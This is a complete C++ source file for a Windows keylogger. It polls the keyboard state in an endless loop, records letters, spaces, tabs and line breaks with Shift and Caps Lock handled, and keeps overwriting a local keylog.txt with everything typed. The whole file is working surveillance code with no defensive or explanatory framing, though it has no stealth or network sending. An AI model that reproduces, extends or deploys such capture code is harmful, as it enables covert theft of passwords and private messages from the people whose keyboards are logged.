#include <iostream>
#include <fstream>
#include <windows.h>
#include <string>

using namespace std;

string data_press;

bool handle_Capslock(){
    return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
}

bool handle_Shift(){
    return (GetKeyState(VK_SHIFT) & 0x8000) != 0;
}

void log(){

    ofstream wkey("keylog.txt", ios::trunc);
    if(wkey.is_open()){
        wkey << data_press;
        wkey.close();

    }else{
        cout << "Failed to open file.";
    }
}

string key_to_string(int key){
    if(key >= 'A' && key <= 'Z'){

        bool CapsLock = handle_Capslock();
        bool Shift = handle_Shift();

        if(CapsLock ^ Shift){
            return string(1, char(key));
        }else{
            return string(1, char(key + 32));
        }
    }

    switch(key){
        case VK_RETURN : return "\n";
        case VK_SPACE : return " ";
        case VK_TAB : return "\t";
        default: return "";

    }
    return "";
}

bool handle_BackSpace(){
    if(!data_press.empty()){
        data_press.pop_back();
    }
    log();
    return "";
}

int main(){
    while(true){
        for(int key = 8; key <= 190; key++){
            if(GetAsyncKeyState(key) & 0x0001){
                if(key == 8){
                    handle_BackSpace();
                }else{
                    string key_press = key_to_string(key);
                    if(!key_press.empty()){
                        data_press += key_press;
                    }
                    log();
                }
            }
        }
        Sleep(10);
    }
    return 0;
}